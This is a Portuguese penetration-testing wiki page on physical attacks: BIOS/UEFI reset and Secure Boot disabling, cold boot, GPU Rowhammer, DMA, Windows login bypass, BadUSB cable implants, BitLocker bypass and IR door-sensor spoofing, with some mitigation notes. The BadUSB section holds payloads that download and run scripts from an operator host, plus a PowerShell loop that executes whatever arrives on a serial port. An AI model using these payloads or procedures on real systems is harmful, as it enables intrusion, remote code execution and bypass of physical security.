# Ataques Físicos

{{#include ../banners/hacktricks-training.md}}

## Recuperação da Senha do BIOS e Segurança do Sistema

**Redefinir o BIOS** pode ser feito de várias maneiras. A maioria das placas-mãe inclui uma **bateria** que, quando removida por cerca de **30 minutos**, redefinirá as configurações do BIOS, incluindo a senha. Como alternativa, um **jumper na placa-mãe** pode ser ajustado para redefinir essas configurações conectando pinos específicos.

Em situações nas quais ajustes de hardware não são possíveis ou práticos, **ferramentas de software** oferecem uma solução. Executar um sistema a partir de um **Live CD/USB** com distribuições como o **Kali Linux** fornece acesso a ferramentas como **_killCmos_** e **_CmosPWD_**, que podem auxiliar na recuperação da senha do BIOS.

Nos casos em que a senha do BIOS é desconhecida, inseri-la incorretamente **três vezes** normalmente resultará em um código de erro. Esse código pode ser usado em sites como [https://bios-pw.org](https://bios-pw.org) para potencialmente obter uma senha utilizável.

### Segurança do UEFI

Para sistemas modernos que usam **UEFI** em vez do BIOS tradicional, a ferramenta **chipsec** pode ser utilizada para analisar e modificar as configurações do UEFI, incluindo a desativação do **Secure Boot**. Isso pode ser feito com o seguinte comando:
```bash
python chipsec_main.py -module exploits.secure.boot.pk
```
---

## Análise de RAM e Cold Boot Attacks

A RAM retém dados brevemente após o corte de energia, geralmente por **1 a 2 minutos**. Essa persistência pode ser estendida para **10 minutos** aplicando substâncias frias, como nitrogênio líquido. Durante esse período estendido, um **memory dump** pode ser criado usando ferramentas como **dd.exe** e **volatility** para análise.

---

## GPU Rowhammer Contra Page Tables

Os ataques modernos de GPU Rowhammer se tornam muito mais úteis quando têm como alvo **metadados de memória virtual da GPU**, em vez de buffers comuns. Trabalhos recentes sobre **GDDR6 NVIDIA Ampere GPUs** mostram que um atacante executando código CUDA sem privilégios pode criar padrões de hammering específicos para GPU, usar **memory massaging** para posicionar estruturas de paginação em linhas vulneráveis e, então, inverter bits na **last-level page table** ou em um **page directory** intermediário. Depois que uma única entrada de tradução é corrompida, o atacante pode obter **arbitrary GPU memory read/write** e, em seguida, pivotar para comprometer o host.<sup>[[1]](#references)[[2]](#references)</sup>

### Exploitation Pattern

1. **Profile hammerable rows** em GDDR6 e crie padrões de hammering cientes do refresh / não uniformes que contornem as mitigações in-DRAM.
2. **Massage GPU allocations** para que o driver posicione estruturas de tradução de páginas em locais físicos vulneráveis, em vez de mantê-las no pool protegido padrão. Na prática, isso pode significar esgotar a região de page tables de baixa memória e fazer o spraying de grandes mapeamentos UVM esparsos com strides controlados.
3. **Flip translation metadata**, como **PFN** ou bits relacionados ao aperture, dentro de uma entrada de page table / page directory, fazendo com que a página virtual controlada pelo atacante seja resolvida para páginas de page tables, memória arbitrária da GPU ou mapeamentos de sistema visíveis ao host.
4. Reutilize o mapeamento forjado para reescrever entradas de tradução adicionais e escalar para **arbitrary GPU memory read/write** entre contextos de GPU.

### Host Pivot and Mitigations

- Com a **IOMMU desabilitada**, mapeamentos forjados de system-aperture podem expor **host physical memory** arbitrária à GPU, transformando o primitive da GPU em comprometimento completo do host.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** tem como alvo entradas de last-level page tables, enquanto **GeForge** mostra que corromper um nível de page directory pode ser mais fácil, pois uma inversão de bit pode redirecionar uma subárvore de tradução maior. Não trate apenas uma camada de paginação como security-critical.<sup>[[1]](#references)[[2]](#references)</sup>
- A **IOMMU** ainda é importante porque bloqueia o caminho direto para memória arbitrária do host usado por GDDRHammer/GeForge, mas **não é uma mitigação completa**. **GPUBreach** mostra um pivot de segundo estágio no qual o atacante corrompe buffers de CPU controláveis pela GPU e pertencentes ao driver e, em seguida, aciona bugs de memory safety no driver NVIDIA para obter um kernel write primitive e um **root shell**, mesmo com a IOMMU habilitada.<sup>[[3]](#references)</sup>
- **System-level ECC** é uma medida prática de hardening em GPUs de workstation/server compatíveis. GPUs de consumo sem ECC expõem uma superfície de defesa mais fraca.<sup>[[4]](#references)</sup>
- Esses ataques não são puramente teóricos: o **GeForge** relatou **1.171** bit flips em uma RTX 3060 e **202** em uma RTX A6000, o que foi suficiente para criar uma cadeia funcional de privilege escalation no host.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Ataques de Direct Memory Access (DMA)

O **INCEPTION** é uma ferramenta criada para **physical memory manipulation** por meio de DMA, compatível com interfaces como **FireWire** e **Thunderbolt**. Ela permite contornar procedimentos de login alterando a memória para aceitar qualquer senha. No entanto, é ineficaz contra sistemas **Windows 10**.

---

## Live CD/USB para Acesso ao Sistema

Alterar binários do sistema, como **_sethc.exe_** ou **_Utilman.exe_**, usando uma cópia do **_cmd.exe_** pode fornecer um prompt de comando com privilégios de sistema. Ferramentas como **chntpw** podem ser usadas para editar o arquivo **SAM** de uma instalação do Windows, permitindo alterar senhas.

O **Kon-Boot** é uma ferramenta que facilita o login em sistemas Windows sem conhecer a senha, modificando temporariamente o kernel do Windows ou a UEFI. Mais informações podem ser encontradas em [https://www.raymond.cc](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password/).<sup>[[10]](#references)</sup>

---

## Tratamento dos Recursos de Segurança do Windows

### Atalhos de Boot e Recovery

- **Supr**: Acessar as configurações da BIOS.
- **F8**: Entrar no modo Recovery.
- Pressionar **Shift** após o banner do Windows pode contornar o autologon.

### Dispositivos BAD USB

Dispositivos como **Rubber Ducky** e **Teensyduino** servem como plataformas para criar dispositivos **bad USB**, capazes de executar payloads predefinidos quando conectados a um computador-alvo.

### Volume Shadow Copy

Privilégios de administrador permitem criar cópias de arquivos sensíveis, incluindo o arquivo **SAM**, por meio do PowerShell.

## Técnicas de BadUSB / HID Implant

### Wi-Fi managed cable implants

- Implants baseados em ESP32-S3, como o **Evil Crow Cable Wind**, ficam ocultos dentro de cabos USB-A→USB-C ou USB-C↔USB-C, enumeram exclusivamente como um teclado USB e expõem seu C2 por Wi-Fi. O operador só precisa alimentar o cabo pelo host da vítima, criar um hotspot chamado `Evil Crow Cable Wind` com a senha `123456789` e acessar [http://cable-wind.local/](http://cable-wind.local/) (ou seu endereço DHCP) para chegar à interface HTTP incorporada.<sup>[[8]](#references)</sup>
- A interface do navegador fornece abas para *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* e *Config*. Os payloads armazenados são identificados por sistema operacional, os layouts de teclado são alternados dinamicamente e as strings VID/PID podem ser alteradas para imitar periféricos conhecidos.
- Como o C2 fica dentro do cabo, um telefone pode preparar payloads, acionar sua execução e gerenciar credenciais Wi-Fi sem interagir com o sistema operacional do host — ideal para intrusões físicas de curto tempo de permanência.

### OS-aware AutoExec payloads

- As regras do AutoExec associam um ou mais payloads para serem executados imediatamente após a enumeração USB. O implant realiza uma identificação leve do sistema operacional e seleciona o script correspondente.
- Fluxo de trabalho de exemplo:
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) ou `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Como a execução não requer intervenção, simplesmente trocar um cabo de carregamento pode obter acesso inicial de “plug-and-pwn” no contexto do usuário conectado.

### HID-bootstrapped remote shell over Wi-Fi TCP

1. **Keystroke bootstrap:** Um payload armazenado abre um console e cola um loop que executa tudo o que chegar no novo dispositivo serial USB. Uma variante mínima para Windows é:
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Ponte de cabo:** O implant mantém o canal USB CDC aberto enquanto seu ESP32-S3 inicia um cliente TCP (script Python, APK Android ou executável para desktop) de volta ao operador. Quaisquer bytes digitados na sessão TCP são encaminhados para o loop serial acima, permitindo a execução remota de comandos até mesmo em hosts isolados de redes externas. A saída é limitada, portanto os operadores normalmente executam comandos às cegas (criação de contas, preparação de ferramentas adicionais etc.).

### Superfície de atualização OTA via HTTP

- A mesma stack web geralmente expõe atualizações de firmware sem autenticação. Evil Crow Cable Wind escuta em `/update` e grava qualquer binário enviado:
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- Operadores em campo podem trocar recursos dinamicamente (por exemplo, fazer flash do firmware do USB Army Knife) durante o engagement sem abrir o cabo, permitindo que o implant mude para novos recursos enquanto continua conectado ao host-alvo.

## Bypass da Criptografia BitLocker

A criptografia BitLocker pode potencialmente ser contornada se a **recovery password** for encontrada em um arquivo de dump de memória (**MEMORY.DMP**). Ferramentas como **Elcomsoft Forensic Disk Decryptor** ou **Passware Kit Forensic** podem ser utilizadas para essa finalidade.

---

## Social Engineering para Adicionar uma Recovery Key

Uma nova recovery key do BitLocker pode ser adicionada por meio de táticas de social engineering, convencendo um usuário a executar um comando que adiciona uma nova recovery key composta por zeros, simplificando assim o processo de decryption.

---

## Explorando Chassis Intrusion / Maintenance Switches para Restaurar o BIOS às Configurações de Fábrica

Muitos laptops modernos e desktops small-form-factor incluem um **chassis-intrusion switch**, monitorado pelo Embedded Controller (EC) e pelo firmware BIOS/UEFI. Embora a finalidade principal do switch seja gerar um alerta quando o dispositivo é aberto, alguns vendors implementam um **atalho de recovery não documentado**, acionado quando o switch é alternado em um padrão específico.<sup>[[5]](#references)[[6]](#references)</sup>

### Como o Attack Funciona

1. O switch é conectado a uma **interrupção GPIO** no EC.
2. O firmware executado no EC mantém o controle do **timing e do número de pressionamentos**.
3. Quando um padrão definido no código é reconhecido, o EC invoca uma rotina de *mainboard-reset* que **apaga o conteúdo da NVRAM/CMOS do sistema**.
4. Na próxima inicialização, o BIOS carrega os valores padrão – **a supervisor password, as Secure Boot keys e toda a configuração personalizada são apagadas**.

> Quando o Secure Boot está desabilitado e a firmware password foi removida, o atacante pode simplesmente inicializar qualquer imagem de OS externa e obter acesso irrestrito às unidades internas.

### Exemplo no Mundo Real – Laptop Framework 13

O atalho de recovery para o Framework 13 (11ª/12ª/13ª geração) é:
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
Após o décimo ciclo, o EC define uma flag que instrui o BIOS a apagar a NVRAM na próxima reinicialização. Todo o procedimento leva ~40 s e requer **nada além de uma chave de fenda**.<sup>[[5]](#references)</sup>

### Procedimento Genérico de Exploitation

1. Ligue o alvo ou faça uma suspensão-retomada para que o EC esteja em execução.
2. Remova a tampa inferior para expor o interruptor de intrusão/manutenção.
3. Reproduza o padrão de alternância específico do vendor (consulte a documentação, fóruns ou faça reverse-engineering do firmware do EC).
4. Reinstale a tampa e reinicie – as proteções do firmware devem estar desativadas.
5. Inicialize um live USB (por exemplo, Kali Linux) e realize o post-exploitation habitual (extração de credenciais, exfiltração de dados, implantação de binários EFI maliciosos etc.).

### Detecção e Mitigação

* Registre eventos de intrusão do chassi no console de gerenciamento do sistema operacional e correlacione-os com resets inesperados do BIOS.
* Use **lacres invioláveis** nos parafusos/tampas para detectar abertura.
* Mantenha os dispositivos em áreas **fisicamente controladas**; presuma que o acesso físico equivale ao comprometimento total.
* Quando disponível, desative o recurso “maintenance switch reset” do vendor ou exija uma autorização criptográfica adicional para resets da NVRAM.

---

## Injeção IR Encoberta Contra Sensores de Saída No-Touch

### Características do Sensor
- Sensores comuns de “wave-to-exit” combinam um emissor de LED IR próximo com um módulo receptor semelhante aos de controles remotos de TV, que só reporta nível lógico alto após detectar vários pulsos (~4–10) da portadora correta (≈30 kHz).<sup>[[7]](#references)</sup>
- Uma cobertura plástica impede que o emissor e o receptor se observem diretamente, fazendo o controlador presumir que qualquer portadora validada veio de uma reflexão próxima e acionar um relé que libera a fechadura da porta.
- Quando o controlador acredita que um alvo está presente, ele frequentemente altera o envelope de modulação de saída, mas o receptor continua aceitando qualquer rajada que corresponda à portadora filtrada.

### Fluxo do Attack
1. **Capture o perfil de emissão** – conecte um analisador lógico aos pinos do controlador para registrar as formas de onda pré-detecção e pós-detecção que acionam o LED IR interno.
2. **Reproduza apenas a forma de onda “pós-detecção”** – remova/ignore o emissor original e acione um LED IR externo com o padrão já disparado desde o início. Como o receptor só considera a contagem/frequência dos pulsos, ele trata a portadora falsificada como uma reflexão genuína e ativa a linha do relé.
3. **Controle a transmissão** – transmita a portadora em rajadas ajustadas (por exemplo, dezenas de milissegundos ligada e um período semelhante desligada) para fornecer a contagem mínima de pulsos sem saturar o AGC do receptor ou sua lógica de tratamento de interferências. A emissão contínua rapidamente dessensibiliza o sensor e impede o acionamento do relé.

### Injeção Refletiva de Longo Alcance
- Substituir o LED de bancada por um diodo IR de alta potência, um driver MOSFET e óptica de focalização permite um acionamento confiável a ~6 m de distância.
- O atacante não precisa de linha de visão para a abertura do receptor; apontar o feixe para paredes internas, prateleiras ou batentes de portas visíveis através do vidro permite que a energia refletida entre no campo de visão de ~30° e imite um movimento de mão a curta distância.
- Como os receptores esperam apenas reflexões fracas, um feixe externo muito mais forte pode ricochetear em várias superfícies e ainda permanecer acima do limiar de detecção.

### Attack Torch Weaponised
- Incorporar o driver em uma lanterna comercial oculta a ferramenta à vista. Substitua o LED visível por um LED IR de alta potência compatível com a faixa do receptor, adicione um ATtiny412 (ou similar) para gerar as rajadas de ≈30 kHz e use um MOSFET para drenar a corrente do LED.
- Uma lente telescópica com zoom estreita o feixe para aumentar o alcance/a precisão, enquanto um motor de vibração sob controle do MCU fornece confirmação háptica de que a modulação está ativa, sem emitir luz visível.
- Alternar entre vários padrões de modulação armazenados (frequências de portadora e envelopes ligeiramente diferentes) aumenta a compatibilidade entre famílias de sensores rebranded, permitindo ao operador varrer superfícies refletivas até ouvir o clique do relé e a porta ser liberada.

---

## Referências

- [1] [GDDRHammer: Greatly Disturbing DRAM Rows — Cross-Component Rowhammer Attacks from Modern GPUs](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: Hammering GDDR Memory to Forge GPU Page Tables for Fun and Profit](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Privilege Escalation Attacks on GPUs using Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Security Notice: Rowhammer - July 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. Press here to pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “Noooooooo Touch! – Bypassing IR No-Touch Exit Sensors with a Covert IR Torch”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “Plug, Play, Pwn: Hacking with Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - Rowhammer Attack Against NVIDIA Chips](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [raymond.cc - Login To Windows Administrator And Linux Root Account Without Knowing Or Changing Current Password](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password)

{{#include ../banners/hacktricks-training.md}}
